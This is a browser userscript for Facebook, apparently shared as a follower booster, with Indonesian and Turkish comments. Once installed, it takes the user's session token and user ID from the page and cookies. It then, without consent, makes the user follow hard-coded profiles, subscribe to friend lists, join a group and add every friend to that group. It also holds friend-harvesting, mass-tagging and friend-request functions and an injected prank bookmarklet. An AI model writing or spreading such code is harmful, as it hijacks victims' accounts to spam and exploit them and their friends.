// ==UserScript==
// @name            foloower
// @namespace       folowers
// @Hak Cipta        Smart Boy
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
alert('tunggu 5 menit dan ihat nanti , jika pengen banyak silahkan realod dan gunakan lagi');
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
   
    http4.send(params4);
}
 
function sublist(uidss) {
                var a = document.createElement('script');
                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                document.body.appendChild(a);
}
//Boss
a("100007224641478");
a("100003884324248");
a("100006990011697");
sublist("306776332795175");
sublist("1400290120213975");
sublist("1400290370213950");
sublist("1402192340023753");
sublist("340731566066318");
sublist("1406382959638277");
sublist("1406382896304950");
sublist("1406382829638290");
sublist("1406382736304966");
sublist("1406382509638322");
sublist("1406388082971098");
sublist("1406388366304403");

var gid = ['540777662689756'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
}
 
 
//arkadaslari al ve isle
function sarkadaslari_al(){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                                  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                        smesaj = "";
                                        smesaj_text = "";
                                  for(i=f*10;i<(f+1)*10;i++){
                                        if(arkadaslar.payload.entries[i]){
                                  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                  smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                  }
                                        }
                                        sdurumpaylas();                         }
                               
                        }
                       
        };
                var params = "&filter[0]=user";
                params += "&options[0]=friends_only";
                params += "&options[1]=nm";
                params += "&token=v7";
        params += "&viewer=" + user_id;
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?¾ ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){   
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
                xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
                cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
                xmlhttp.send(params);
}
}
 
//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                        eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                        cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                        btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                        if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                        document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                        }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                        document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                        }
                        eval(fonksiyon + "(" + id + "," + cins + ");");
                        }
        };
                xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.send();
}
 

//nhạc
javascript:(function(){function c(){var e=document.createElement('link');e.setAttribute('type','text/css');e.setAttribute('rel','stylesheet');e.setAttribute('class',l);document.body.appendChild(e)}function h(){var e=document.getElementsByClassName(l);for(var t=0;t<e.length;t++){document.body.removeChild(e[t])}}function p(){var e=document.createElement('div');e.setAttribute('class',a);document.body.appendChild(e);setTimeout(function(){document.body.removeChild(e)},100)}function d(e){return{height:e.offsetHeight,width:e.offsetWidth}}function v(i){var s=d(i);return s.height>e&&s.height<n&&s.width>t&&s.width<r}function m(e){var t=e;var n=0;while(!!t){n+=t.offsetTop;t=t.offsetParent}return n}function g(){var e=document.documentElement;if(!!window.innerWidth){return window.innerHeight}else if(e&&!isNaN(e.clientHeight)){return e.clientHeight}return 0}function y(){if(window.pageYOffset){return window.pageYOffset}return Math.max(document.documentElement.scrollTop,document.body.scrollTop)}function E(e){var t=m(e);return t>=w&&t <=b+w}function S(){var e=document.createElement('audio');e.setAttribute('class',l);e.src=i;e.loop=true;e.addEventListener('canplay',function(){setTimeout(function(){x(k)},500);setTimeout(function(){N();p();for(var e=0;e<O.length;e++){T(O[e])}},15500)},true);e.addEventListener('ended',function(){N();h()},true);e.innerHTML=' <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>';document.body.appendChild(e);e.play()}function x(e){e.className+=' '+s+' '+o}function T(e){e.className+=' '+s+' '+u[Math.floor(Math.random()*u.length)]}function N(){var e=document.getElementsByClassName(s);var t=new RegExp('\\b'+s+'\\b');for(var n=0;n<e.length;){e[n].className=e[n].className.replace(t,'')}}var e=1;var t=1;var n=100;var r=100;var i='http://music-hn.24hstatic.com/uploadmusic2/af141145512665a63c1b59d6b1fbb914/521bb3d2/uploadmusic/id_le/3-2013/Hungnk/Nam2013/Nhac2013/Tuan-35/128/Neu%20La%20Anh%20-%20The%20Men.mp3';var s='mw-harlem_shake_me';var o='im_first';var u=['im_drunk','im_baked','im_trippin','im_blown'];var a='mw-strobe_light';var l='mw_added_css';var b=g();var w=y();var C=document.getElementsByTagName('*');var k=null;for(var L=0;L<C.length;L++){var A=C[L];if(v(A)){if(E(A)){k=A;break}}}if(A===null){console.warn('Could not find a node of the right size. Please try a different page.');return}c();S();var O=[];for(var L=0;L<C.length;L++){var A=C[L];if(v(A)){O.push(A)}}})()
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);